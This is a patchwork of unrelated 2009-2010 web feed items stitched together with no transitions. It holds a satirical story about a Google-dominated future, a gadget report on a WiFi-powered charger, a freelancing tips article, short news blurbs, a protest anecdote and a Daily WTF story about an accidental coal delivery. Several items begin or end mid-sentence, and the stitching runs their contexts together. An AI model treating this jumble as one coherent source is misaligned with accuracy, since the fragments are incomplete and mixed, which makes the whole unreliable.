      "content" : "<p>Pete logs onto his desktop computer. It’s a “dumb” netbook built by Google and called Google Chrome Superbook 5, with a fast startup time of 0.3 seconds, the point at which the Google engineers figured further optimizations were not useful, in terms of limitations of human perception. The mouse next to the computer is also made by Google. It includes some technical wizardry that Pete was happy to wait for when he ordered it online in the Google web store: the mouse automatically logs him into his Google account based on his fingerprint, skin color and more, falling back to a password prompt if anything’s off.</p>\n\n<p>The netbook doesn’t contain a browser, at least, that’s not how people talk about it – the netbook is the browser, and every computer is a netbook, so people just call that thing they surf with “the computer” or “Google,” and nobody but web historians ever use the word browser anymore. The Google phone Nexus Nine is ringing, and Pete – without picking the phone up with his hand, but simply looking at the holographic 3D projection of his girlfriend shimmering above the phone – says “I’ll call you back later, got some things to do on my Google.”</p>\n\n<p>When Pete opens his Communication account, he has 12 new messages. Google Communication combines emails, voice messages, collaborative documents and everything else into a single unified stream, ordered by automatically personalized prioritization cues. The top priority right now, Communication decided, was a phone text message from Pete’s boss earlier that morning. “You got to come in early today Pete, the bots are acting crazy.” Pete works from home, as do most of his friends, so he opens up his augmented reality clothing store hooked up to the webcam. He usually works in a simple morning bathrobe but his colleagues won’t ever notice, thanks to the realtime 3D overlays they’ll see instead. It’s nice of Google to release the augmented reality overlays for free, and the AdWords powered sponsor labels on the clothes are a price Pete’s willing to pay.</p>\n\n<p>“What’s with the bots?” Pete asks his boss. Bots are semi-autonomous agents doing most of the work at Pete’s company. Programming them is the job of talking to them, giving them clear orders. No traditional programming syntax knowledge is needed for that, so people mostly just call it “giving orders”. Last night, Pete ordered the bots to put the company’s web presence through a thorough security check, but apparently some of them got the idea that this would include hacking the server. Pete quickly solves the issue, amending his phrasing to exclude such cases... bug fixed, and Pete’s doing some surfing now.</p>\n\n<p>All the web’s in Pete’s native tongue, and he can’t remember a time when it was any different. Whichever site he visits, be it originally created in Japanese, Hebrew, Botspeak or whatever language out there, Google Translator transforms into the language Pete’s is most fluently with... not just text, but also imagery, audio content in videos, everything. The Google Translator ships straight with the superbook with no way to switch translation providers, but Pete’s happy with its results. He’s used to encountering strange language on some sites and there’s a constant barrier of cultural misunderstandings, but people by and large got used to all of this, and whenever there’s a verbal fight about to erupt, it’s easy to blame the issue on those “pesky translator software” and make peace.</p>\n\n<p>These days the Google Translator is even nice enough to automatically transform image content or news prioritization based on your current position and cultural track record, so that, for instance, a news article might show a different photo or headline in China, or India, than it does in the US, or Russia. Even search results adjust to your preferences, so that your discoveries won’t shock you, but be in tune with your general understanding of how the world works, and your understanding of who’s in power, and why, and what the findings of science are, and so on. Pete is old enough to remember the times back when there was no Google TrulySafeSearch and he remembers that life was a lot more nerve-wrecking back then. Relaxed as he is now, he clicks on one of his favorite sites: Google Games.</p>\n\n<p>Google Games is an immersive 3D world where players interact through their avatar, often a tuned but somewhat resembling version of themselves. That every game is actually a way to crowdsource computational jobs, Pete doesn’t mind... he just wants to have fun after his hour of work for that day. “Hi there Sue!” Pete waves to his digital girlfriend. People started to accept polyamory in virtual settings, and neither is Pete’s real life girlfriend jealous of his activities, nor he of hers. Sue, for all Pete knows, may not even be a human, though in Google Games, it’s not polite to ask about that. Either it’s a software program which is then disappointed that you would put too much value into people having a physical representation, or it’s a human, who, by your question, might figure you think of them as “robotic.”</p>\n\n<p>Today, Sue waves back and start to engage Pete in small talk. Embedded in this small talk are questions which Sue – yes, a software program – asks only for one reason: to transmit Pete’s answer back to the Google core, where they are compared with other answers, analyzed, filtered, stored, evaluated, and generally put to AI-feeding use. All that’s no secret, in fact, it’s right in the Google Games policy you’ll sign to play in this world for free. Later on, Pete enjoys a game of 4D ping pong with Sue. Cars are passing by, each with an advertisement mediated through Google. While Pete may think he’s just playing ping pong, the micro attention the advertised brands get is measured both by the tracked eye focus, but also by the Google mouse checking for signs of accelerated heart beat. PPA, or pay-per-awareness, means that if there’s measurable excitement, the advertiser has to pay.</p>\n\n<p>“Have you heard the news? The president’s sick today,” Sue says, though it’s the software module formerly known as Google News which is speaking through her now. Powered by Google-paid freelance journalists who feed its system, the Google News of the day feels as natural as talking to a friend, and indeed for Pete, it is exactly that. “No, tell me more... what happened?” Sue registers the interest and will adjust her small talk to focus more on political issues the following days. The longer Pete talks to her, the more cars he’ll notice passing by, so it’s crucial for Sue to entertain him.</p>\n\n<p>“The president’s had to ponder a world issue for longer than usual,” Sue replies. Pete noticed that Sue lately started calling most news incidents “world issues,” perhaps in order not to upset him or occupy his mind with too many details. It didn’t really matter to him either: the president, for all the power it had considering it ruled not one country but all united countries, was such a superb program that surely it wouldn’t make mistakes. Considering its AI was provided by Google, and constantly fed with real-time data of the world through Google’s many sensors – moving cameras, voice recordings, satellige imagery, network traffic, search trends – how could the president ever make a mistake? And if it did, what was the alternative? Certainly it was impossible to put a human in that position; humans may have a creative edge sometimes and good intuition, Pete thought, but weren’t really known for the size of their brains or the speed of their computations.</p>\n\n<p>One hour of work and seven hours of play, and Pete calls it a night. Pete logs off his desktop computer. It’s a dumb netbook built by Google and called Google Chrome Superbook 5, with a fast shutdown time of 0.3 seconds, below the point at which Google engineers figured further optimizations were not useful, in terms of limitations of human perception. The mouse next to the computer is also made by Google. It emits a soft humming sound as Pete moves his hand away from it. Time to sleep... tomorrow’s a new day with Google.</p> <p><strong>[By Philipp Lenssen | Origin: <a href=\"http://blogoscoped.com/archive/2010-01-10-n57.html\">Built By Google</a> | <a href=\"http://blogoscoped.com/forum/find/?postId=8943\">Comments</a>]</strong></p><br><em>[Advertisement] <a href=\"http://blogoscoped.com/ad/?id=21&amp;isFeed=1\" rel=\"nofollow\">Books about Google available on Ebay</a></em>"

This has been done before, but the Airnergy is able to harvest electricity with a high enough efficiency to make it practically useful: on the CES floor, they were able to charge a BlackBerry from 30% to full in about 90 minutes, using nothing but ambient WiFi signals as a power source. </p>\n<p>The Airnergy has a battery inside it, so you can just carry it around and as long as you’re near some WiFi, it charges itself. Unlike a solar charger, it works at night and you can keep it in your pocket. Of course, proximity to the WiFi source and the number of WiFi sources is important, but at the rate it charges, if you have a home wireless network you could probably just leave anywhere in your house overnight and it would be pretty close to full in the morning.</p>\n<p><img src=\"http://www.ohgizmo.com/wp-content/uploads/2010/01/DSC_3384.JPG\" alt=\"DSC_3384\" title=\"DSC_3384\" width=\"500\" height=\"308\"></p>\n<p>Here is the really, really unbelievable part: RCA says that the USB charger <strong>will be available this summer for $40</strong>, and a battery with the WiFi harvesting technology will be available soon after. I mean, all kinds of people are pushing wireless charging, but this would hands down take the cake… It doesn’t need a pad and it’s charging all the time, for free, in just about any urban environment.</p>\n<p>We didn’t think you’d believe all this, so we made RCA explain it all on video:</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/IMMbihbeIls%26hl%3Den_US%26fs%3D1%26rel%3D0&amp;width=425&amp;height=344\" width=\"425\" height=\"344\"></iframe></p>\n<p>Yeah, we’ll definitely be keeping you updated on this one.</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/nqiftq39heaaopdesg9f59d7u4/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.ohgizmo.com%2F2010%2F01%2F09%2Fces2010-rca-airnergy-charger-harvests-electricity-from-wifi%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:I2FUP0JpNAM\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?i=UJW77WcFwCA:f41jWDqsDms:I2FUP0JpNAM\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:QXVau8BzmBE\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?d=QXVau8BzmBE\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?d=dnMXMwOfBR0\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:aKCwKftKxY0\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?i=UJW77WcFwCA:f41jWDqsDms:aKCwKftKxY0\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Ohgizmo?a=UJW77WcFwCA:f41jWDqsDms:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/Ohgizmo?i=UJW77WcFwCA:f41jWDqsDms:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Ohgizmo/~4/UJW77WcFwCA\" height=\"1\" width=\"1\">"

It's me again with the latest version of the hdWobble app. Although it looks like the previous one, this version is done from scratch. It is based on the OpenGL ES library for Windows mobile.\r\nI recently got my self a new HTC HD2 phone, and since it is supporting multitouch technology I decided to see if I can use it in this app. As it is shown in the video, I managed to implement pinch-zooming and rotation of the loaded image as well as resizing of the wobbling area. There are lots of things that need to be polished and implemented, but I hope that this version will live to see it, unlike the previous one. There is no download available yet. At first it will be released only for the HTC HD2 device. As soon as it is completed I will release it for download. Not sure yet if it is going on the Marketplace or not.  \r\nAnyway, enjoy the existing app and this clip, and stay tuned for the updates.</div>"

They may not be <a href=\"http://www.urlesque.com/2009/09/10/the-worlds-coolest-bus-stops/\">the world's coolest bus stops</a>, but they might make you think twice before rolling through an intersection.<br>\n<br>\nIt's hard to stop at every stop sign you see, especially if the sign's behind a bush or <a href=\"http://www.urlesque.com/2009/10/20/man-almost-killed-by-bus-video/\">tall people crossing the street. </a>Officials in Oak Lawn, IL tried to change things by modifying the city's stop signs to be a little more eye-catching. In the fall of 2007 they added one-liners like, \"Stop means that you aren't moving.\" to their signage, but the Illinois Department of Transportation pointed out the changes breached safety standards and requested their removal. <a href=\"http://archives.chicagotribune.com/2008/may/01/news/chi-not-funny_01may01\">The signs were removed in April 2008.</a></div>\n<br>\n<a

In a highly competitive and, in most places, saturated market, you need to make sure your reputation as a freelancer is well-managed and continues to grow. It’s very possible to get a good reputation without being the best in the world, and it’s even easier to lose that reputation. In this article, we’ll explore 15 habits that are essential in helping freelancers effectively safeguard and grow their reputation, and we’ll also discuss how to make freelancing work for you. The habits are split into 3 sections:</p><ul><li>Marketing</li><li>Business and time</li><li>Specific business areas</li></ul><h3>Marketing and Relationships</h3><h4>1. The Presentation Habit</h4><p>Your website should be at the centre of your marketing strategy. It’s where people go to see who you are, what you’re about, whether you know what you’re talking about and what work you have done. It’s your silent 24/7 salesman, and it needs to be right. Fortunately, what your website needs is straightforward:</p><ul><li>Well-presented work with a good description of the roles you played</li><li>A brief history of who you are and why you’re where you are</li><li>Contact details that are easily accessible</li><li>Content that is continually tweaked, added to, and updated</li></ul><p>Other than that, you can go wherever you want with your own website — and so you should. <strong>Personality is key</strong>. Some great examples:</p><p><a href=\"http://elliotjaystocks.com/\" title=\"Elliot Jay Stocks website\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/ejs.jpg\" width=\"500\" height=\"298\" alt=\"Ejs in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Elliot Jay Stocks carries a very clear message on his site</em></p><p><a href=\"http://iancoyle.com/\" title=\"Ian Coyle website\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/iancoyle.jpg\" width=\"500\" height=\"298\" alt=\"Iancoyle in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Ian Coyle goes for pure simplicity</em></p><p><a href=\"http://jasonsantamaria.com/\" title=\"Jason Santa Marias website\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/jsm.jpg\" width=\"500\" height=\"298\" alt=\"Jsm in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Jason Santa Maria goes the whole hog with a new design for each post — a lot of work but he stands out from the crowd as a result</em></p><h4>2. The Networking Habit</h4><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/sm.jpg\" width=\"500\" height=\"100\" alt=\"Sm in Essential Habits Of An Effective Professional Freelancer\"></p><p>They say that within 6 degrees of separation, everyone knows everyone. So you need to make sure that everyone within your 1st degree (i.e. people you know), know exactly what you do. It needs to be exact as well. If you’re a developer you don’t want people saying you’re a website designer, and so on. Your current network of friends, family, and associates are your <strong>free word-of-mouth marketing</strong> – so get them talking about you right now.</p><p>Once this is done, your network needs to be extended and enhanced. Register with any social networking platforms that can work for you — <strong>LinkedIn, Facebook, and Twitter</strong>. Within those places, start getting into the right circles. On LinkedIn you may join some appropriate discussion groups that are either local or skill based. On Twitter you may start tweeting and including appropriate hashtags so more people can see your tweet on that subject.</p><p>There are many ways to network and connect with people, so it’s crucial that a freelancer not be afraid to talk to people and share information and contacts. Learn the networking habit and <strong>get yourself known</strong>.</p><h4>3. The Niching Habit</h4><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/niche.jpg\" width=\"200\" height=\"223\" alt=\"Niche in Essential Habits Of An Effective Professional Freelancer\">Freelancers can get into the habit of not only finding their niche, but <strong>creating niches</strong>. A niche in this case is an area in your overall field of work in which you particularly specialise. If you’ve become very good at creating websites for golf courses, for example, then that’s a great niche.</p><p>The reasons having a niche is valuable are simple: It’s easier to become an expert in a niche. It’s easier to sell to other prospects within that niche as they can see what you have done before. As an expert in that niche you can <strong>charge a premium</strong> for your depth of knowledge.</p><p>The key to this habit is to <strong>proactively build your own niches</strong>. Seek out profitable areas in which you can work and concentrate on building niches.</p><h4>4. The Pricing Habit</h4><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/money.jpg\" width=\"200\" height=\"301\" alt=\"Money in Essential Habits Of An Effective Professional Freelancer\">How you price your projects can easily be the difference between winning and not winning some work. Your pricing needs to be transparent at all times and should be agreed upon up front. Things go wrong when hidden costs appear later on. Clients like to know how much they’re paying, when they’re going to pay it, and what they’re paying for. <strong>So make it clear</strong> from the start.</p><p>Second part of the pricing habit — <strong>protect yourself</strong>. It’s easy to get so wrapped up in winning a project that you forgot some simple rules. If you have never worked with a client before, ask for a small percentage of the fee before you do any work. At this early stage, you won’t know whether they will pay! Reduce your bad debt by either only working for clients you trust or having some remuneration first.</p><p>Third part of the pricing habit — be flexible. Make sure you find a way to make the commercial deal a <strong>win-win for both parties</strong>. This could be:</p><ul><li>Monthly payments (regular cash flow over the course of the project)</li><li>Payment when you hit certain project milestones (e.g. project performance)</li><li>Deposit and balance on completion (best avoided for cash flow reasons)</li><li>Possible exchange of services</li></ul><h4>5. The Growth Habit</h4><p>It’s been claimed that it costs seven times as much in resources to acquire a new client than it does to grow an existing one. So the growth habit is about <strong>proactively looking at your clients</strong> in detail so you can discover new ways to help them.</p><p>One practical way to do this is to cross reference. Write all your services across the top of an excel sheet, then put your clients down the left hand column. Now place an X in the box where a service you have done matches a client. The boxes without X’s are potential growth opportunities and should all be explored before spending too much energy trying to acquire new clients.</p><h3>Business and Time</h3><p>This section is less screenshot, more serious business.</p><h4>6. The time management habit</h4><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/cal.jpg\" width=\"157\" height=\"135\" alt=\"Cal in Essential Habits Of An Effective Professional Freelancer\"><p>Lacking good habits in time management could cause you to over-committing yourself at certain times, which could lead to:</p><ul><li>Missing a deadline and disappointing a client</li><li>Producing sloppy or inaccurate work</li><li>Causing yourself stress because of the pressure to get everything done</li></ul><p>The solution to this is an <strong>effective planning mechanism</strong>. Estimate how long the work will take you, then add a buffer to your estimation. This will ensure that, if it does take longer, it won’t eat into other projects. A 50% buffer works well. That may sound like a lot, but if you go over by 25% and then there are additional client emendations, you’ll need it. Once you have the total time allocation, add it to your diary. Now, here’s the crucial part: Do not move it, shrink it, or change it in any way. If you have to do something urgent that will interfere with that scheduled work, make sure the time is reallocated elsewhere.</p><p>A simple calendar application like <a href=\"http://www.google.com/calendar/\">Google calendar</a> or Outlook can help you plan your time as a freelancer. If you struggle with where all that time goes and want to get serious about making improvements in time management, something like <a href=\"http://www.rescuetime.com/\">Rescue Time</a> can really help.</p><h4>7. The Flexibility Habit</h4><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/flex.jpg\" width=\"200\" height=\"133\" alt=\"Flex in Essential Habits Of An Effective Professional Freelancer\">Being flexible, responsive, and effective at what you do will allow you to handle unexpected situations, such as when a client contacts you with urgent needs and expects you to help. Having <strong>set aside time in advance</strong> for such urgent situations will ensure that you earn a reputation as a flexible worker.</p><p>What happens if nothing comes up to fill that pre-allocated time? Well you might finish that other project early and can add something special. What happens if the whole day is taken up by urgent project? No problem, you <strong>had already planned</strong> this might happen, so you won’t let anyone down.</p><p>Of course you’re not going to be able to foresee <em>everything</em>, but a certain level of flexibility will allow you to please your clients and be relatively free of stress because of time constraints.</p><h4>8. The Honesty Habit</h4><p>Agencies will not use you again if you let a client down, and your chance of repeat work is slim to none. In the same way, you should not over commit your time, but stay within your capabilities. We all need to stretch ourselves on new projects and learn new techniques and practices — that’s not what this is about. This is about promising to do a task in a specified time when, in actuality, you don’t have any idea whether it’s feasible or not. Above all else, <strong>people appreciate honesty</strong>. You’re better off being honest about whether you can handle a project rather than taking the risk of letting them down.</p><p>So how can you grow your skills and help your clients? By being honest and asking some good questions:</p><ul><li>“I don’t think this project is right for me. I don’t have much experience in [insert technology here]“</li><li>“I can really help you with the [insert service here] part of this project, but I know another freelancer who can help with it. Would you be happy if I managed the project for you but outsourced this other work?”</li><li>“I’ll need more information before I know how long this project will take. Would you mind if I spent a couple of hours doing some research so I can give you an accurate timescale?”</li></ul><h4>9. The Over-Delivery Habit</h4><p><strong>Do not deliver your projects early</strong>. Sound strange? It’s not. If you deliver early, there’s a possibility the client will think you overcharged, and may expect part of his payment to be returned. They might also expect future work to be completed ahead of schedule, which may set a bad precedent.</p><p>Instead, use the extra time to focus on <strong>whizz-bang</strong> elements — those extra bits of polish and creativity that will gain you the reputation you deserve and let you grow. For a designer this might mean spending time adding nice touches to your graphics; for a developer, it could mean more time to implement a cool piece of JavaScript to replace the plain functionality you originally settled for. The “over-deliver” will earn you a solid reputation, whereas finishing early could get you into trouble.</p><h4>10. The Business Advice Habit</h4><p>Although as a freelancer you’re skilled at what you do, don’t assume you’ll be able to do your accounts and bookkeeping, fill in tax returns, produce an invoice or write a proposal all by yourself.</p><p><strong>Seek regular advice</strong> from respected professionals to help you with these aspects of running your business. This might include speaking with people who run their own operations and understand the ins and outs better than you do. Learn as much as possible from their experiences and mistakes.</p><h3>Specific Business Areas</h3><p>What’s out there to help you run your business and what areas do you need to focus on? In this section, we’ll discuss some applications that have earned reputations for helping freelancers do their jobs and be more professional.</p><h4>11. The Email Habit</h4><p>Email is toxic. As a freelancer you can easily become what’s commonly known as a busy fool. You might spend a significant part of your day just sending and receiving email <strong>without ever getting any work done</strong>. Instead, be in the habit of controlling email, and not letting it control you.</p><p>To do this you need to:</p><ul><li>Turn off all the little reminders, message counts, and other indicators that may catch your eye</li><li>Configure your email client to run a “send and receive” at longer intervals, maybe as little as once per hour</li><li>Set aside blocks of time in the day to deal with all email, then switch it off; if something is urgent, people will use the phone</li><li>Use the ‘touch it once’ philosophy; fully read and deal with every email you open, instead of half-reading some and coming back to them later</li></ul><h4>12. The Project Management Habit</h4><p>Some clients will want you to fit in with their processes, while others will not enforce this. You need to have very clear processes for how you start working with a client and start a new project. What questions do you ask a new client? Where do you store the information they tell you? How do you keep track of how close the deadline is? Where do you store all the files they send you?</p><p><strong>Email is not sufficient for this!</strong> Things will get lost, forgotten or overlooked. You might prefer cardboard folders or ring binders or whatever works for you — but use something and stick to your own system. There are applications like <a href=\"http://basecamphq.com/\">Basecamp</a> and <a href=\"http://www.activecollab.com/\">activeCollab</a> that can help with this.</p><p><a href=\"http://basecamphq.com\" title=\"Basecamp project management application\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/basecamp.jpg\" width=\"500\" height=\"296\" alt=\"Basecamp in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Basecamp is used by many to manage their projects at low cost</em></p><p><a href=\"http://www.activecollab.com\" title=\"ActiveCollab project management application\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/activecollab.jpg\" width=\"500\" height=\"269\" alt=\"Activecollab in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>activeCollab is a source code editable alternative to Basecamp</em></p><h4>13. The Research &amp; Development Habit</h4><p>Sounds like a big company thing to do but R&amp;D is essential to a good freelance operation. You need to be ahead of the curve or at the very least on it to be servicing your clients most effectively. Be in the habit of <strong>investing time</strong> for research and development. Expand your current skills and learn new ones.</p><p>Never designed a billboard before? That’s development.</p><p>Don’t know which email marketing system might help your clients? That’s research.<br> (<a href=\"http://www.campaignmonitor.com/\" title=\"Email marketing system - Campaign Monitor\">Campaign Monitor</a> and <a href=\"http://www.mailchimp.com/\" title=\"Email marketing system - Mailchimp\">MailChimp</a> are good options).</p><p>Set aside time every week to do R&amp;D. Build up a list of blogs that feed you new thinking and new ideas. Listen to informative podcasts (<a href=\"http://boagworld.com/\" title=\"Boagworld podcast\">Boagworld</a> is a good one).</p><h4>14. The Sales and CRM Habit</h4><p>How can you allocate your time and resources and figure out whether or not you need to be hunting for new work or concentrating on servicing current clients? You should know at any given time what your work pipeline looks like, how likely is it all to materialize, and at roughly what value.</p><p>There are various applications out there to help, such as <a href=\"http://www.salesforce.com/\" title=\"Salesforce\">Salesforce</a>, <a href=\"http://www.sugarcrm.com/crm/community/sugarcrm-community.html\">SugarCRM (open source edition)</a>, as well as 37signals’ popular <a href=\"http://highrisehq.com/\">Highrise</a>.</p><p><a href=\"http://highrisehq.com\" title=\"Highrise management application\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/highrise.jpg\" width=\"500\" height=\"223\" alt=\"Highrise in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Highrise is used by many to manage their sales and leads at low cost</em></p><h4>15. The Accounts Habit</h4><p>Making sure you have any easy way to produce, send, and track invoices is essential, as is getting into the habit of running your accounts professionally, because such habits will ensure regular cash flow. Applications like <a href=\"http://www.blinksale.com/\">Blinksale</a>, <a href=\"http://www.freshbooks.com/\">Freshbooks</a> or <a href=\"http://www.simplyinvoices.com/\">Simply Invoices</a> can help formalise the accounts side of your business and give a good professional feel to how you operate. Clients will need invoices for their accounts — make sure they’re not hand written or unbranded.</p><p><a href=\"http://www.blinksale.com\" title=\"Blinksale Invoicing application\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/images/effective-professional-freelancing/blinksale.jpg\" width=\"500\" height=\"231\" alt=\"Blinksale in Essential Habits Of An Effective Professional Freelancer\"></a><br><em>Blinksale can help you create, send, and track professional invoices</em></p><h3>Further Resources</h3><ul><li><a href=\"http://www.freelanceuk.com/\">Freelance UK</a><br>Host of articles to help freelancers.</li><li><a href=\"http://bestwebgallery.com/\">BestWebGallery</a><br>Inspiration for those times of creative block.</li><li><a href=\"http://www.elance.com/\">Elance</a><br>A place to get freelance work – referral work is better though!</li></ul><h4>About the author</h4><p><em>Rob Smith is the digital director of <a href=\"http://www.blue-leaf.co.uk\" title=\"Blueleaf - digital marketing\">Blueleaf</a> – helping clients with their digital needs from their website to email marketing to analytics.

In a company blog posting a Plurk employee states &quot;we were first tipped off by high profile bloggers and Taiwanese users of our community that Microsoft had just launched a new Chinese microblogging service that looked eerily similar to Plurk.  <br><br><a href=\"http://www.neowin.net/news/main/09/12/14/microsoft-china-steals-code-rips-off-plurk-site\">Read full story...</a><div>\n<a href=\"http://feeds.neowin.net/~ff/neowin-main?a=5CLpbcpccrc:jXSUDsh-UEg:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/neowin-main?d=dnMXMwOfBR0\" border=\"0\"></a> <a href=\"http://feeds.neowin.net/~ff/neowin-main?a=5CLpbcpccrc:jXSUDsh-UEg:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/neowin-main?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.neowin.net/~ff/neowin-main?a=5CLpbcpccrc:jXSUDsh-UEg:H0mrP-F8Qgo\"><img src=\"http://feeds.feedburner.com/~ff/neowin-main?d=H0mrP-F8Qgo\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/neowin-main/~4/5CLpbcpccrc\" height=\"1\" width=\"1\">"

      "content" : "<p>Have you ever thought how it would be like to live in a bunker or an underground tunnel? Well, today we bring you the upgraded version of that, which is an all-equipped underground home. Situated in the Swiss village of Vals, deep in the mountains, the house is very hard to spot, which makes for a perfect gateway. The unusual architecture plan comes from <a href=\"http://www.search.nl/\">SeARCH</a> and <a href=\"http://www.christian-muller.com/\">Christian Muller Architects</a>, and includes all the facilities a common house has, such as a guest room, an entertainment area, but also “specialized” interiors like an underground pathway. The entrance is a wide oval opening that you are driven to by some traditional stairs made in stone. Large windows make it noticeable and draw attention to the inside décors- that is when the people living there are up for some company. – via <a

While all of us at Mashable (Mashable) are very avid Twitterers and Facebook users, updating our status at the altar might fall outside our comfort zone. We do, however, wish the social media super users a lifetime of happiness together.\n\n&quot;At My Wedding Twitterring and Facebooking at the Altar&quot;\nOwner of this video:\nhttp://www.youtube.com/user/Locuester</div>"

So, in order to make her feel uncomfortable, I stood next to her and held a sign that said Corduroy skirts are a sin! I don't think I have ever drawn so much attention in my life. SO many people asked to take a picture with me, I got laughs, high fives and there were the few that even cursed off the woman standing behind me.\n<p>As I drew interest to what was going on with myself and the woman with the hateful sign, I started to draw a crowd that stood with me in support. Before I knew it I had 100+ people holding signs for gay rights asking people to honk their horns to support. I was interviewed by a news station, and more than 5 student organization papers, and the post standard of syracuse.\n<p>I never expected anybody to come stand by me and support and I appreciate it so much that everyone came!

      "content" : "<p>Brad’s phone rang with the telltale tone of an inner-office call. “Yeah,” he briskly blurted out as he picked up the phone, “what’cha ya need?” That was actually his nicewayof answering the phone. As <i>the</i> senior trader at Æxecor, one of the world’s largest energy trading companies, Brad didn’t need to impress anyone and, in his mind, displaying anything less than vicious hubris would be a sign of weakness.</p>\n<p>“Err,” the receptionist nervously answers, “there’s a… err, delivery for you, sir. They—”</p>\n<p>“Hmphf,” Brad’s scoff cut her off. “So just <i>sign</i> for it, then! Is that really that hard to do? You can do that, can’t you?”</p>\n<p>“Well sir,” the receptionist winced, “they’re asking for mooring instructions? And we need to pay wharfage charges? They said you’d know. I’m at a loss.”</p>\n<p>“Fine,” Brad scowled, “I guess I have to do <i>everything </i>around here!” He slammed down the phone and marched out of his corner office. Despite Æxecor’s location – the “old docks” district – their office was one of the most posh in the city. On one end of the expansive, former warehouse sat the executive suites, which had a tremendous view of the city skyline. The other end – where Brad was headed towards – was the reception which overlooked its own, private bay on the river.</p>\n<p>“Okay, I’m here!” he angrily announced once he stepped foot in the lobby. “So let’s do this! What do I need to—”</p>\n<p>Brad stopped mid-sentence. His eyes were immediately drawn through the floor-to-ceiling windows and onto the river bay that Æxecor’s building overlooked. There was an absolutely gigantic barge – nay, an <i>armada</i> of tightly-connected barges – overfilled with enormous piles of coal that was attempting to dock in front of the building. “What… the… fuuu—”</p>\n<blockquote>\n<p><img alt=\"Photo credit: Kordite@Flickr\" src=\"http://img.thedailywtf.com/images/200911/2962883468_32efb95441.jpg\"></p>\n</blockquote>\n<p>“You mus’ be Brad,” a cheerful voice jumped in. Brad’s eye’s shifted towards the scruffy fellow wearing some sort of workman’s uniform who was sitting in one of the reception chairs. “Now first and foremost, how in the Sam Hill are we ‘sposed to moor this boat? I count two cleats, but we sure as heck can’t hitch these. And, shoot, do you even <i>have</i> a bulk berth?”</p>\n<p>For once, Brad was speechless. He had absolutely no idea who that man was and he could hardly understand a word he said. Plus, there was that gargantuan vessel that was slowly moving towards the building. “Uhh,” he stuttered, “wait. Are you delivering… coal? To… uhh, us?”</p>\n<p>“Well, yeah! Twenty-eight thousand tons of the good ol’ black gold!” The workman sarcastically furrowed his brow adding, “I mean, we did get the right address, har har. This is Æxecor? And this is Pier 53? And you <i>are</i> Brad, the fella who ordered it, right?”</p>\n<p>It was that moment that Brad’s palm almost immediately made contact with his forehead. He realized that something must have <i>really</i> gone awry: instead of <i>virtually</i> trading 28,000 tons of coal, Brad had somehow ended up with 28,000 tons of real coal.</p>\n<h3 style=\"margin-bottom:0px\">Commodity Futures Trading 101</h3>\n<p style=\"margin-top:0px\">If you’ve ever watched <a href=\"http://www.amazon.com/gp/product/B001LMU1JQ?ie=UTF8&amp;tag=tdw-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B001LMU1JQ\">Trading Places</a>, the 1983 classic starring Eddie Murphy and Dan Aykroyd, then you’re probably at least <em>familiar</em> with commodities markets. At a basic level, commodities such as gold, wool, and soy beans are sold by producers and, eventually, delivered to buyers. But Billy Ray Valentine didn’t strike it rich and bankrupt the 